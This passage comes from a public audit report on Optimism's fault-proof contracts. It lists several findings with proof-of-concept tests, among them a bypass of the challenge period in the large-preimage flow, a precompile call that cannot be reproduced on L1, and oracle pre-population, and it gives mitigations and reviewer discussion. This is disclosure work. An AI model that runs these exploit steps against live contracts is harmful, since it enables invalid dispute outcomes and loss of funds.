            state.pc,
            state.nextPC,
            state.lo,
            state.hi,
            state.heap,
            state.exitCode,
            state.exited,
            state.step,
            encodedRegisters
        );

        bytes32 honestPostState = honestMips.step(encodedState, proof, 0);
        bytes32 hackedPostState = hackedMips.step(encodedState, proof, 0);

        // 🚨 and this is where a honest participant can lose a dispute
        assertNotEq(honestPostState, hackedPostState);
    }
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Consider fixing the three issues exploited in the PoC:

- Do not allow calling `initLPP()` again on proposals with non-zero `proposalMetadata`.
- Within `initLPP()`, remove the unnecessary storage read at L431.
- Within `squeezeLPP`, consider introducing a sanity check that `bytesProcessed == claimedSize` as on LPP finalization.

### Assessed type

Invalid Validation

**[ajsutton (Optimism) confirmed via duplicate Issue #14](https://github.com/code-423n4/2024-07-optimism-findings/issues/14#event-13703241593)**

***

## [[H-04] L2 precompile calls can be impossible to reproduce on L1](https://github.com/code-423n4/2024-07-optimism-findings/issues/22)
*Submitted by [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/22), also found by [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/28)*

When certain precompiles are invoked in an L2 transaction, the OP fault proof program substitutes their logic with "type 6" preimage oracle queries. Reviewing the [op-program code](https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/op-program/client/l2/engineapi/precompiles.go#L52-L66) shows that the `ecrecover` (`0x1`), `bn256Pairing` (`0x8`), and `kzgPointEvaluation` (`0xa`) precompile addresses are currently part of this "precompile accelerators" system. For this system to function correctly, a precompile call on L2 must always be reproducible on L1 via the `loadPrecompilePreimagePart()` function in the `PreimageOracle`. This is currently not guaranteed in at least one scenario on OP mainnet.

Specifically, note that the `bn256Pairing` precompile has an unbounded gas cost of `34_000 * k + 45_000`, where `k` is the input size divided by 192. This means that a user can call the `bn256Pairing` precompile on L2 with an input that uses nearly the entire L2 block gas limit. Currently, the block gas limit on both Ethereum mainnet and OP mainnet is `30_000_000`. Since the block gas limits are the same, every precompile call on L2 is theoretically reproducible on L1 in isolation. However, since the `loadPrecompilePreimagePart()` function has its own overhead gas costs, it can be shown that some L2 precompile calls can be impossible to reproduce for the purposes of the `PreimageOracle`.

For example, consider a scenario where the following smart contract is successfully called on L2:

```solidity
pragma solidity 0.8.18;

contract L2GasLimit {
    fallback() external {
        assembly {
            let success := staticcall(
                gas(),
                0x08,
                0x80,
                165504,
                0x0,
                0x0
            )
            if iszero(success) { revert(0, 0) }
        }
    }
}
```

Since the input is `165_504` bytes, the cost of calling the `bn256Pairing` precompile is `29_353_000` gas. However, since [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) limits the amount of gas the `PreimageOracle` can forward to `63/64` of its available gas, the `loadPrecompilePreimagePart()` function would require `29_353_000 * 64 / 63 = 29_818_920` gas in order to reproduce this precompile call successfully. There are two options for a user to attempt to meet this threshold:

1. The user calls `loadPrecompilePreimagePart()` from an EOA. Note that the input passed to the precompile needs to be provided as an argument:

    ```solidity
    function loadPrecompilePreimagePart(uint256 _partOffset, address _precompile, bytes calldata _input) external {
        // ...
    }
    ```

    Since the user spends 4 gas for every zero byte of calldata, this means they will have spent at least `4 * 165_504 = 662_016` gas before the function even begins. This implies the function can begin with at most `30_000_000 - 662_016 = 29_337_984` gas, which is insufficient for the precompile call alone. *Side note: there is no trick that can get around providing all `165_504` zero bytes in calldata, because [Solidity does not allow calldata to point out-of-bounds](https://github.com/ethereum/solidity/pull/4224).*

2. The user calls `loadPrecompilePreimagePart()` using another smart contract. Since EIP-150 would also limit this contract to forwarding at most `63/64` of its available gas, and since `30_000_000 * 63 / 64 = 29_531_250`, this method also cannot possibly start `loadPrecompilePreimagePart()` with enough gas.

As a result, this L2 precompile transaction will lead to a preimage oracle query that is impossible to satisfy on L1. This would make the corresponding `step()` impossible to execute, which would prevent invalid state transitions from being countered.

### Proof of Concept

The following test can be added to `op-e2e/faultproofs/output_cannon_test.go`:

```go
func TestImpossiblePrecompileCallBug(t *testing.T) {
    /**********************************************************************
    1. General setup
    **********************************************************************/
    op_e2e.InitParallel(t, op_e2e.UsesCannon)

    ctx := context.Background()
    sys, _ := StartFaultDisputeSystem(t, WithBlobBatches())
    t.Cleanup(sys.Close)

    // NOTE: Flake prevention. Copied from other tests
    safeBlock, err := sys.Clients["sequencer"].BlockByNumber(ctx, big.NewInt(int64(rpc.SafeBlockNumber)))
    require.NoError(t, err)
    require.NoError(t, wait.ForSafeBlock(ctx, sys.RollupClient("sequencer"), safeBlock.NumberU64()+1))
    t.Logf("AUDIT: L2 block gas limit: %d", safeBlock.GasLimit())

    /**********************************************************************
    2. Create a contract that will call the 0x08 precompile efficiently
    **********************************************************************/
    deployReceipt := op_e2e.SendL2Tx(t, sys.Cfg, sys.Clients["sequencer"], sys.Cfg.Secrets.Alice, func(opts *op_e2e.TxOpts) {
        opts.Gas = 1_000_000
        opts.ToAddr = nil

        // Below is the initcode for the following contract:
        /**********************************************************************
        pragma solidity 0.8.18;

        contract L2GasLimit {
            fallback() external {
                assembly {
                    let success := staticcall(
                        gas(),
                        0x08,
                        0x80,
                        165504,
                        0x0,
                        0x0
                    )
                    if iszero(success) { revert(0, 0) }
                }
            }
        }
        **********************************************************************/
        initCodeHex := "6080604052348015600f57600080fd5b50605d80601d6000396000f3fe6080604052348015600f576"
        initCodeHex += "00080fd5b5060008062028680608060085afa602557600080fd5b00fea26469706673582212209e7bb"
        initCodeHex += "5e756d6686f69b47dc161cf0dc1ff83238b405d23bbc542328f68ed76c064736f6c63430008120033"
        initCode, err := hex.DecodeString(initCodeHex)
        require.NoError(t, err)
        opts.Data = initCode
    })

    t.Logf("AUDIT: Deploy tx gasUsed: %d", deployReceipt.GasUsed)
    t.Logf("AUDIT: Deploy tx block number: %d", deployReceipt.BlockNumber)
    t.Logf("AUDIT: Deploy tx contractAddress: %s", deployReceipt.ContractAddress.Hex())

    /**********************************************************************
    3. Call the contract, using nearly 30_000_000 gas
    **********************************************************************/
    precompileReceipt := op_e2e.SendL2Tx(t, sys.Cfg, sys.Clients["sequencer"], sys.Cfg.Secrets.Alice, func(opts *op_e2e.TxOpts) {
        // Note: the initial l1 attributes tx almost always uses less than 70k gas
        opts.Gas = 30_000_000 - 70_000
        opts.ToAddr = &deployReceipt.ContractAddress
        opts.Nonce = 1
        opts.Data = nil
    })

    // Not necessary, but this shows how much gas the initial l1 attributes tx used
    l1AttrTx, _ := sys.Clients["sequencer"].TransactionInBlock(ctx, precompileReceipt.BlockHash, 0)
    l1AttrTxReceipt, _ := sys.Clients["sequencer"].TransactionReceipt(ctx, l1AttrTx.Hash())
    t.Logf("AUDIT: Contract call initial tx gas used: %d", l1AttrTxReceipt.GasUsed)

    // Show that the precompile call succeeded
    t.Logf("AUDIT: Contract call block number: %d", precompileReceipt.BlockNumber)
    t.Logf("AUDIT: Contract call gas used: %d", precompileReceipt.GasUsed)
    t.Logf("AUDIT: Contract call status: %d", precompileReceipt.Status)
    t.Logf("AUDIT: Contract call cumulative gas used: %d", precompileReceipt.CumulativeGasUsed)

    /**********************************************************************
    4. Run a dispute game on the block of the precompile call. Notice that
    the challenger will fail because the gas required is too high for the
    PreimageOracle to ever succeed
    **********************************************************************/
    disputeGameFactory := disputegame.NewFactoryHelper(t, ctx, sys)
    game := disputeGameFactory.StartOutputCannonGame(ctx, "sequencer", precompileReceipt.BlockNumber.Uint64(), common.Hash{0x01, 0xaa})
    require.NotNil(t, game)
    outputRootClaim := game.DisputeBlock(ctx, precompileReceipt.BlockNumber.Uint64())
    game.LogGameData(ctx)

    game.StartChallenger(ctx, "Challenger", challenger.WithPrivKey(sys.Cfg.Secrets.Alice))

    outputRootClaim = outputRootClaim.WaitForCounterClaim(ctx)

    preimageLoadCheck := game.CreateStepPreimageLoadCheck(ctx)
    game.ChallengeToPreimageLoad(ctx, outputRootClaim, sys.Cfg.Secrets.Alice, utils.FirstPrecompilePreimageLoad(), preimageLoadCheck, true)
}
```

After running `go test ./faultproofs -run TestImpossiblePrecompileCallBug -v -timeout=60m > test_output.txt`, the output can be inspected as follows:

```
    > grep "AUDIT:" test_output.txt; grep -B 3 "Failed to load preimage part" test_output.txt;
        output_cannon_test.go:409: AUDIT: L2 block gas limit: 30000000
        output_cannon_test.go:446: AUDIT: Deploy tx gasUsed: 73521
        output_cannon_test.go:447: AUDIT: Deploy tx block number: 9
        output_cannon_test.go:448: AUDIT: Deploy tx contractAddress: 0xbdEd0D2bf404bdcBa897a74E6657f1f12e5C6fb6
        output_cannon_test.go:464: AUDIT: Contract call initial tx gas used: 52182
        output_cannon_test.go:467: AUDIT: Contract call block number: 10
        output_cannon_test.go:468: AUDIT: Contract call gas used: 29442018
        output_cannon_test.go:469: AUDIT: Contract call status: 1
        output_cannon_test.go:470: AUDIT: Contract call cumulative gas used: 29494200
                    Error:          Received unexpected error:
                                    oversized data: transaction size 165754, limit 131072
                    Test:           TestImpossiblePrecompileCallBug
                    Messages:       Failed to load preimage part
```

This shows that the L2 precompile call succeeded, and the challenger failed to load the preimage for the relevant execution step. In this case, the error is due to a transaction size limit, which is another limitation in addition to the gas issues described above.

Also note that before running the test, the following change is useful for `op-challenger/game/fault/preimages/split.go` to ensure it differentiates large precompile calls from large keccak256 preimages:

```diff
- if data.IsLocal || uint64(len(data.GetPreimageWithoutSize())) < s.largePreimageSizeThreshold {
+ if data.OracleKey[0] != byte(2) || uint64(len(data.GetPreimageWithoutSize())) < s.largePreimageSizeThreshold {
      return s.directUploader.UploadPreimage(ctx, parent, data)
  } else {
      return s.largeUploader.UploadPreimage(ctx, parent, data)
  }
```

### Tools Used

The op-e2e test suite.

### Recommended Mitigation Steps

If possible, the "accelerated precompiles" system should avoid precompiles that have dynamic gas costs. Although this would imply a larger execution trace for precompile calls that would otherwise be supported, this seems to be the safest option in the long term. This is especially true if the block gas limits on L2 are ever changed to exceed the L1 block gas limit.

**[ajsutton (Optimism) confirmed via duplicate Issue #28](https://github.com/code-423n4/2024-07-optimism-findings/issues/28#event-13717728956)**

**[Inphi (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/22#issuecomment-2261204097):**
 > This is valid but [out of scope](https://github.com/code-423n4/2024-07-optimism?tab=readme-ov-file#automated-findings--publicly-known-issues) as it was highlighted in the Spearbit audit. See section 5.1.1 in the audit report.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/22#issuecomment-2264399189):**
 > While it is similar, I don't believe this is a dup of the known issue.
> 
> That issue specifically points to the more serious concern issue that the `loadPrecompilePart()` function can be called with ANY amount of gas, causing it to revert when it succeeded on L2. Basically, there is no connection between L2 gas for the precompile and L1.
> 
> This issue is focused on that fact that, even if such a connection existed, there are precompile calls on L2 that can not be included on L1.

**[Inphi (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/22#issuecomment-2264552702):**
 > On second thought, I agree with your assessment for the above reason.

***

## [[H-05] An attacker can bypass the challenge period during LPP finalization](https://github.com/code-423n4/2024-07-optimism-findings/issues/13)
*Submitted by [alexfilippov314](https://github.com/code-423n4/2024-07-optimism-findings/issues/13), also found by [kuprum](https://github.com/code-423n4/2024-07-optimism-findings/issues/102), [0x1771](https://github.com/code-423n4/2024-07-optimism-findings/issues/98), [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/21), [ether\_sky](https://github.com/code-423n4/2024-07-optimism-findings/issues/19), and [Femboys](https://github.com/code-423n4/2024-07-optimism-findings/issues/3)*

Large preimage proposals (LPP) allow submitters to prove that certain data is a fixed part of the large preimage that produces a specific Keccak-256 hash value. Since the preimage is large, the process of LPP finalization involves multiple transactions. Because the intermediate steps are not verified on-chain, LPP flow requires a challenge period during which challengers can verify the correctness of the LPP and dispute it on-chain via the `challengeLPP` and `challengeFirstLPP` functions.

The issue arises from the fact that the current implementation of the `squeezeLPP` function allows a malicious submitter to bypass the challenge period and finalize an invalid proposal. I've provided a detailed description of why it is possible below.

The `squeezeLPP` function checks that the challenge period is still active using this check:

```solidity
if (block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
```

While it looks correct, the problem here is that the timestamp is not initialized in the `initLPP` function. If the `metadata.timestamp()` is zero this check will always succeed (assuming that `block.timestamp > CHALLENGE_PERIOD`). The only place where `metadata.timestamp` is set is in the `addLeavesLPP` function, if the attacker provided a true value for the `_finalize` argument.

```solidity
if (_finalize) {
    metaData = metaData.setTimestamp(uint64(block.timestamp));

    // If the number of bytes processed is not equal to the claimed size, the proposal cannot be finalized.
    if (metaData.bytesProcessed() != metaData.claimedSize()) revert InvalidInputSize();
}
```

While it may seem logical, the current flow does not require the submitter to provide a true value for the `_finalize` argument in any of their calls. This fact is demonstrated in the POC below. This means that the submitter can make the necessary number of `addLeavesLPP` calls with `_finalize = false` and then call `squeezeLPP` immediately after (since the `metadata.timestamp` remains uninitialized), without having to wait for the challenge period to pass. Since there is no challenge period, a malicious submitter can submit invalid proposals without the risk of being challenged.

The full attack is demonstrated in the POC below.

### Impact

This issue demonstrates that a malicious submitter can bypass the challenge period and finalize invalid LPPs. Since this data is assumed to be correct and is used in the `MIPS.sol`, this attack allows a malicious submitter to successfully challenge valid claims and forge invalid claims that cannot be challenged. In summary, the attack has no preconditions, can be executed by anyone, and completely breaks the fault dispute game logic. That's why I believe the severity is HIGH.

### Proof of Concept

```solidity
contract PreimageOracle_LargePreimageProposals_Test is Test {
    ...
    function test_squeeze_challengePeriodActive_not_revert() public {
        //! Set an appropriate value for block.timestamp.
        vm.warp(1721643596);

        // Allocate the preimage data.
        bytes memory data = new bytes(136);
        for (uint256 i; i < data.length; i++) {
            data[i] = 0xFF;
        }
        bytes memory phonyData = new bytes(136);

        // Initialize the proposal.
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));

        // Add the leaves to the tree with mismatching state commitments.
        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
        //! The attacker doesn't set _finalize to true but pads the data correctly.
        oracle.addLeavesLPP(TEST_UUID, 0, LibKeccak.padMemory(phonyData), stateCommitments, false); 

        // Construct the leaf preimage data for the blocks added.
        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, phonyData);
        leaves[0].stateCommitment = stateCommitments[0];
        leaves[1].stateCommitment = stateCommitments[1];

        // Create a proof array with 16 elements.
        bytes32[] memory preProof = new bytes32[](16);
        preProof[0] = _hashLeaf(leaves[1]);
        bytes32[] memory postProof = new bytes32[](16);
        postProof[0] = _hashLeaf(leaves[0]);
        for (uint256 i = 1; i < preProof.length; i++) {
            bytes32 zeroHash = oracle.zeroHashes(i);
            preProof[i] = zeroHash;
            postProof[i] = zeroHash;
        }

        // Finalize the proposal.
        //! This call must revert since the challenge period has not passed.
        //! However, it does not revert.
        // vm.expectRevert(ActiveProposal.selector);
        uint256 balanceBefore = address(this).balance;
        oracle.squeezeLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
            _preState: leaves[0],
            _preStateProof: preProof,
            _postState: leaves[1],
            _postStateProof: postProof
        });

        assertEq(address(this).balance, balanceBefore + oracle.MIN_BOND_SIZE());
        assertEq(oracle.proposalBonds(address(this), TEST_UUID), 0);

        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
        //! The commented value is the correct value for the preimage part.
        // bytes32 expectedPart = bytes32((~uint256(0) & ~(uint256(type(uint64).max) << 192)) | (data.length << 192));
        //! This value is not correct for the preimage part.
        bytes32 phonyPart = 0x0000000000000088000000000000000000000000000000000000000000000000;
        //! An invalid LPP is finalized and can be used in the MIPS.sol
        assertTrue(oracle.preimagePartOk(finalDigest, 0));
        assertEq(oracle.preimageLengths(finalDigest), phonyData.length);
        assertEq(oracle.preimageParts(finalDigest, 0), phonyPart);
    }
    ...
}
```

### Recommended Mitigation Steps

Consider checking that the proposal was finalized in the `squeezeLPP` function:

```solidity
if (metaData.timestamp() == 0 || block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
```

### Assessed type

Invalid Validation

**[ajsutton (Optimism) confirmed](https://github.com/code-423n4/2024-07-optimism-findings/issues/13#issuecomment-2261670515)**

***

# Medium Risk Findings (11)
## [[M-01] Multiplication overflow leading to memory corruption and incorrect register write-back](https://github.com/code-423n4/2024-07-optimism-findings/issues/85)
*Submitted by [Topmark](https://github.com/code-423n4/2024-07-optimism-findings/issues/85)*

<https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L967><br><https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L763>

### Impact

The unchecked multiplication of int32 values (rs and rt) and type conversion within the execute function in MIPS contract can result in an overflow, leading to the assignment of an incorrect value to the val variable in the step(...) function. This incorrect value is subsequently written to memory and the destination register in the step function. This can cause data corruption in contract and break of Proper MIPS contract functionality and storage

### Proof of Concept

```solidity
 function step(bytes calldata _stateData, bytes calldata _proof, bytes32 _localContext) public returns (bytes32) {
        unchecked {
...
 uint32 val = execute(insn, rs, rt, mem) & 0xffFFffFF; // swr outputs more than 4 bytes without the mask
...
     // write memory
            if (storeAddr != 0xFF_FF_FF_FF) {
                writeMem(storeAddr, 1, val);
            }

            // write back the value to destination register
            return handleRd(rdReg, val, true);
        }
}
```

The function provided above shows how step(...) function is implemented in the MIPS.sol contract, it can be noted from the code fragments provided in the function that the value of val is set by making a call to the execute(...) function and this value was used to write memory later in the function to the destination register, it can be noted that this was done within the unchecked region.

```solidity
function execute(uint32 insn, uint32 rs, uint32 rt, uint32 mem) internal pure returns (uint32 out) {
        unchecked {
...
if (opcode == 0 || (opcode >= 8 && opcode < 0xF)) {
...
} else {
                // SPECIAL2
                if (opcode == 0x1C) {
                    uint32 func = insn & 0x3f; // 6-bits
                    // mul
                    if (func == 0x2) {
>>>                        return uint32(int32(rs) * int32(rt)); ❌
                    }
                    // clz, clo
                    else if (func == 0x20 || func == 0x21) {
                    ... } 
                 ...}
    ...
    }
...
}
```

The code above shows how the execute(...) function was implemented, as noted in the pointer above the unchecked multiplication of int32 values (rs and rt) & type conversion to uint32 within the execute function above would lead to an overflow, which would result in incorrect calculation. This is because multiplication of certain values within int32 can go above the max int32 value, the problem with this issue is that the operation was carried out inside an unchecked environment and it was converted to type uint32 even though the value might have gone above it, which means the overflow which would have normally revert would go unnoticed thereby corrupting write memory and sending wrong value data to destination register in the step function.

**Scenario Proof:**

Assuming rs is 2147483647 (maximum positive value for int32) and rt is 2.
The multiplication `2147483647 * 2` should normally result in 4294967294, which exceeds the maximum value for int32, but with an overflow it results to a completely different result.

### Recommended Mitigation Steps

To prevent overflow, the multiplication should be checked for overflow before proceeding with the operation. One way to achieve this is by using SafeMath libraries that provide arithmetic operations with built-in overflow checks or by simply doing the validation as provided in the code below by first doing the multiplication within int64 and validating that it is below maximum of int32 before type conversion.

```solidity
+++  import "@openzeppelin/contracts/utils/math/SafeMath.sol";

function execute(uint32 insn, uint32 rs, uint32 rt, uint32 mem) internal pure returns (uint32 out) {
    ...
    if (opcode == 0x1C) {
        uint32 func = insn & 0x3f; // 6-bits
        // mul
        if (func == 0x2) {
---            return uint32(int32(rs) * int32(rt));
+++            int64 result = int64(int32(rs)) * int64(int32(rt));
+++            require(result <= int32.max && result >= int32.min, "Multiplication overflow");
+++            return uint32(int32(result));
        }
        // clz, clo
        else if (func == 0x20 || func == 0x21) {
            ...
        }
    }
    ...
}
```

### Assessed type

Under/Overflow

**[clabby (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2260865342):**
 > This report is partially valid, and points out a divergence from the MIPS specification. However, the mention of disallowing overflow is _incorrect_, as the specification directly calls for producing a 64-bit result and retaining the low-order 32 bits of it, and never throwing an arithmetic exception.
> 
> In the MIPS specification, the `MUL` instruction description states:
> > The 32-bit word value in GPR rs is multiplied by the 32-bit value in GPR rt, **treating both operands as signed values, to produce a 64-bit result.** The least significant 32 bits of the product are sign-extended and written to GPR rd. The contents of HI and LO are UNPREDICTABLE after the operation. **No arithmetic exception occurs under any circumstances.**
> 
> The current implementation does not perform signed 64-bit arithmetic, casting down the result to a 32 bit value. We should not throw an exception, but we should adhere to the `MUL` spec.

**[Inphi (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2263509858):**
 > Sounds like this should be downgraded to medium in that case. I see no evidence that the Go compiler emits invalid code that would otherwise cause a MIPS exception.

**[obront (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2264513732):**
 > Since there is no evidence that the program can be impacted by this divergence from spec, will award in line with other "divergence that could cause problem but isn't clear exactly how" and downgrade this to Medium.

**[3docSec (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2266685033):**
 > @obront, in light of the fact that "wrap around on overflow" is indeed the correct behavior as per spec, we believe this report is invalid, because it points out to wrapping as root cause and as mitigation it recommends the very same operation with an added `require` that throws in case of overflow (which is not compliant).
> 
> To make the point that the suggested mitigation is functionally equivalent and doesn't yield any difference in result, we investigated the difference between the following 2 implementations:
> 
> - current implementation:
> ```Solidity
> return uint32(int32(rs) * int32(rt));
> ```
> 
> - proposed implementation without the non-compliant throw:
> ```Solidity
> int64 result = int64(int32(rs)) * int64(int32(rt))
> return uint32(int32(result));
> ```
> and found them to be functionally equivalent. 
> 
> This is because execution only cares about the lower 32-bits of the result, so we don't need to store the result in int64 and the upper 32 bits therefore can be safely ignored.
> 
> The following fuzz test demonstrates the equivalence of the original vs mitigation code:
> 
> ```Solidity
> pragma solidity ^0.8.0;
> 
> import "forge-std/Test.sol";
> 
> contract PoC is Test {
> 
>     function testPoc(uint32 rs, uint32 rt) public {
>         unchecked {
>             uint32 res1 = uint32(int32(rs) * int32(rt));
> 
>             int64 res2i = int64(int32(rs)) * int64(int32(rt));
>             uint32 res2 = uint32(int32(res2i));
> 
>             assert(res2 == res1);
>         }
>     }
> 
> }
> ```
> 
> which yields:
>
> *Note: to view the provided image, please see the original comment [here](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2266685033).*

**[Topmark (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2267440499):**
 > I think there is a misconception, I would like to quote xuwinnie from the discussion channel which should throw more light why this should remain valid.
 >
> xuwinnie: "[#15](https://github.com/code-423n4/2024-07-optimism-findings/issues/15), [#82](https://github.com/code-423n4/2024-07-optimism-findings/issues/82), [#85](https://github.com/code-423n4/2024-07-optimism-findings/issues/85), [#89](https://github.com/code-423n4/2024-07-optimism-findings/issues/89) say VM does not throw an exception when prestate is unexpected, which diverges from the spec."
>
> The program can be simplified to
> 
> `outputRoot = run(inputs)`<br>
> if `claimedOutputRoot != outputRoot` return `INVALID`<br>
> else return `VALID`
>
> We don't really care about how VM handles unexpected prestate. Even when `claimedOutputRoot` root is invalid, the program should still run smoothly. so those cases are unreachable.
> 
> Even `run()` cannot properly handle some inputs, it's the op-program's (or the complier's) fault, how MIPS-VM handle these cases doesn't really matter. Suppose A is the expected result of run (`someInputs`), but we get another result B.
> - Not Fixed: only claiming B can be defended.
> - Fixed: (The four reports all suggest a fix that revert inside step, this is not good since it will make the game stuck. A better fix would be set the VM to PANIC) the VM panics, according to [Issue 54](https://github.com/code-423n4/2024-07-optimism-findings/issues/54), every claim can be defended. That's even worse."

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/85#issuecomment-2276653681):**
 > While this issue was incorrect in its specific understanding of the correct behavior and remediation, it was correct in identifying that the program did not hold to spec for the multiplication of int32 values. For that reason, along with the other "likely can't be triggered, but deviate from spec in a way that could cause invalid state transitions to be proven" — I will keep it as a Medium.

***

## [[M-02] Missing address check for instructions LH and LHU](https://github.com/code-423n4/2024-07-optimism-findings/issues/82)
*Submitted by [zraxx](https://github.com/code-423n4/2024-07-optimism-findings/issues/82), also found by [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/128)*

<https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L990-L993><br><https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L1008-L1011>

### Impact

Instruction processing cannot detect problems in time.

### Details

According to [this](<https://www.cs.cmu.edu/afs/cs/academic/class/15740-f97/public/doc/mips-isa.pdf>), page 99, Section Restrictions, the address must be naturally aligned. If the least-significant bit of the address is non-zero, an Address Error exception occurs. However, in the contract, the address is not checked.

### Tools Used

Vscode

### Recommended Mitigation Steps

Check the address and when the least-significant bit of the address is non-zero, revert.

**[clabby (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/82#issuecomment-2260777993):**
 > This report is valid. The `MIPS` VM currently does not check for half-word alignment within the `LH` and `LHU` instruction implementations. Every piece of memory is guaranteed to be 4-byte aligned via the `0xFFFFFFFC` mask prior to the `readMem` call, but the ISA specification explicitly states a requirement for 2-byte alignment for these instructions.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/82#issuecomment-2260798790):**
 > @clabby - If I'm understanding correctly, you're saying that there is no possible risk to this in Optimism's context, but that it is confirmed that it's not following the MIPS spec? If that's the case, I will plan to downgrade to low/QA.

**[clabby (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/82#issuecomment-2260803528):**
 > @obront, I can confirm that we've seen no adverse effects from the out-of-spec implementation of these instructions to date. Though the surface is too large to make a blanket statement on there being no possible risk. We do intend to fix this and align with the MIPS specification.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/82#issuecomment-2264466605):**
 > Because this is a confirmed divergence from the spec and we don't have a firm guarantee that it won't be reached in the program, I will be considering it a valid Medium.

***

## [[M-03] Addresses can be pre-populated with bad data](https://github.com/code-423n4/2024-07-optimism-findings/issues/78)
*Submitted by [bronze\_pickaxe](https://github.com/code-423n4/2024-07-optimism-findings/issues/78), also found by [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/127)*

Inside `PreimageOracle.sol`, anyone can call the `loadPrecompilePreimagePart()` to load data into the contract. The problem is that anyone is able to specify the `address _precompile` parameter. This opens up the door for malicious users to pre-populate data and use it to validate wrong data.

### Proof of Concept

`PreimageOracle.readPreimage()` is used to read already validated `preimage_data`, this happens in the `MIPS.sol` implementation and the `mips.go` implementation:

`mips.go`

```golang
			dat, datLen := m.readPreimage(m.state.PreimageKey, m.state.PreimageOffset)
```

`mips.sol`

```javascript
                    (bytes32 dat, uint256 datLen) = ORACLE.readPreimage(preimageKey, state.preimageOffset);
```

Looking at `readPreimage`, we can notice this check that happens that ensures the field is set to `true`:

```javascript
    function readPreimage(bytes32 _key, uint256 _offset) external view returns (bytes32 dat_, uint256 datLen_) {
->      require(preimagePartOk[_key][_offset], "pre-image must exist");

        // Calculate the length of the pre-image data
        // Add 8 for the length-prefix part
        datLen_ = 32;
        uint256 length = preimageLengths[_key];
        if (_offset + 32 >= length + 8) {
            datLen_ = length + 8 - _offset;
        }

        // Retrieve the pre-image data
        dat_ = preimageParts[_key][_offset];
    }
```

Now, a malicious user can use the address of the next precompile to be added as a parameter, specify the data he wants to be pass and it will set the flag to `true`, enabling the ability to read the preimage with invalid data.

Put this test in `PreimageOracle.t.sol`:

```javascript
    function test_poc() public {
        bytes memory input = hex"deadbeef1337";
        uint256 offset = 0x00;
        // Newly added precompile
        address precompile = address(bytes20(uint160(0x0b)));
        bytes32 key = precompilePreimageKey(precompile, input);
        oracle.loadPrecompilePreimagePart(offset, precompile, input);

        // try reading, it should succeed
        oracle.readPreimage(key, offset);
    }
```

Running it, this is the output:

```
Ran 1 test for test/cannon/PreimageOracle.t.sol:PreimageOracle_Test
[PASS] test_poc() (gas: 78279)
Traces:
  [78279] PreimageOracle_Test::test_poc()
    ├─ [70193] PreimageOracle::loadPrecompilePreimagePart(0, 0x000000000000000000000000000000000000000b, 0xdeadbeef1337)
    │   ├─ [0] 0x000000000000000000000000000000000000000b::deadbeef(1337) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [1420] PreimageOracle::readPreimage(0x06305151be4abfdb70c687fa523f7bcbd835866a36eff720ca0ecbfee10c8320, 0) [staticcall]
    │   └─ ← [Return] 0x0000000000000001010000000000000000000000000000000000000000000000, 9
    └─ ← [Stop]
```

This means that the calls from `cannon` and `mips.sol` can all succeed, leading to malicious users crafting data such that they can validate invalid proofs because the storage can be pre-populated and when doing a read on the precompileimage, it will be `true` and succeed.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/78#issuecomment-2259245158):**
 > This shouldn't be a problem because `op-program` will never use precompile syscall for a non-precompile address, but will ask sponsor to confirm.

**[refcell (Optimism) disputed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/78#issuecomment-2261149714):**
 > The precompile address is [used in the hash](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L344-L351) to create the key and as such makes keys unique for different addresses. Since the program will use the actual precompile addresses here, any custom non-precompile addresses will create different keys and the precompile data will not be affected.

**[bronze_pickaxe (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/78#issuecomment-2265749367):**
 > @obront - the Sponsors comment and your comment are 100% correct.
> 
> However, our report is not about the issue of keys of different addresses.
